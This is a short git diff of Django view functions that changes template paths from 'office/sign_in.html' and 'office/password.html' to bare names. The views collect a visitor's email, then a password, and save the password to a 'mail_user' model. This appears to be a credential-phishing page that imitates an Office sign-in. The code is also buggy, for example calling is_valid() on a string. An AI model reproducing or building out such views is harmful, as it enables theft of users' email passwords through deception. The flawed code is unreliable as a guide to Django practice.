@@ -12,7 +12,7 @@ def Homepage(request):
             return redirect(secondpage, data=email)
         return HttpResponse("Invalid email")
     else:
-        return render(request, "office/sign_in.html")
+        return render(request, "sign_in.html")
     
 
 def secondpage(request, data):
@@ -24,19 +24,19 @@ def secondpage(request, data):
             current_user.save()
             return HttpResponse("Data has been saved")
         else:
-            return render(request, "office/password.html", {'data': data})
+            return render(request, "password.html", {'data': data})
 
 
 
 def password1(request):
     new_password = (["GET"])
     if request.method == "GET":
-        return render(request, "office/password.html")
+        return render(request, "password.html")
     else:
         password = request.POST.get("password")
         if password.is_valid():
             mail_user.objects.create(password=password)
-            return redirect("office/password.html")
+            return redirect("password.html")
 
         
 
